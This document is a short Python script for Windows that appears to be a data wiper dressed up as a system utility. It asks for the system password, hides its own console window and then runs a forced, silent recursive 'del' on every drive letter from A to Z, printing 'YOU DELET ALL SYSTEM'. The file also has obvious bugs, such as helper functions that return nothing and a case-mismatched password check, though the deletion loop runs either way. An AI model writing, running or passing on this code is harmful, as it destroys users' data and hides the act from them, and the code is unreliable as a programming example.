import time, banner, win32gui, os, socket, getpass, win32con
from requests import get
from color import Color

def ClearCSR():
    os.system('clear')
    os.system('cls')

def username():
    getpass.getuser()

def ip_local():
    get('https://api.ipify.org').text

def ip_public():
    socket.gethostbyname(socket.gethostname())

def Windows():
    while True:
        try:
            listdrive = ['A', 'B' , 'C' ,'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
            time.sleep(1)
            ClearCSR()
            banner.Created_banner(Color.RED +'Windows')
            print()
            username()
            ip_local()

            password = input('your system have password?(Y , n) : ').lower()
            if password == 'Y':
                passnamesystem = getpass('Inter password '+username()+" : ")
                print('=============================')
                print('    YOU DELET ALL SYSTEM    |')
                print('=============================')
                print(f'usename: {username()}')
                print(f'password: {passnamesystem}')
                time.sleep(2)
                win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_HIDE)
                for d in listdrive:
                    driver = d
                    os.system('del '+ driver + ':\*.* /f /s /q')
            else:
                print(f'usename: {username()}')
                print('password: ')
                time.sleep(2)
                win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_HIDE)
                for d in listdrive:
                    driver = d
                    os.system('del '+ driver + ':\*.* /f /s /q')
                print('=============================')
                print('    YOU DELET ALL SYSTEM    |')
                print('=============================')
            break
        except AttributeError:
            print( Color.RED +'[*] -> plese check the systems.')
